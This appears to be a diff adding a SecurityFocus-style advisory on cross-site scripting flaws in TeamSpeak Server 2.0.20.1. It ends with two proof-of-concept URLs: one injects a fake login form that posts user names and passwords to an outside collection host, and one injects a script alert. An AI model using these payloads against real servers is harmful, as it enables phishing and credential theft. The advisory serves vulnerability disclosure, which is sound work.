@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/23933/info
+
+TeamSpeak Server is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+TeamSpeak Server 2.0.20.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com:14534/error_box.html?error_title=session expired - please login&error_text=<form action="http://127.0.0.1:31338/own.cgi">User:<inputtype="text"><br>Pass: <input type="password"><br><br><input type="submit"></form>&error_url=index.html http://www.example.com:14534/ok_box.html?ok_title=%3Cscript%3Ealert('hello')%3C/script%3E 
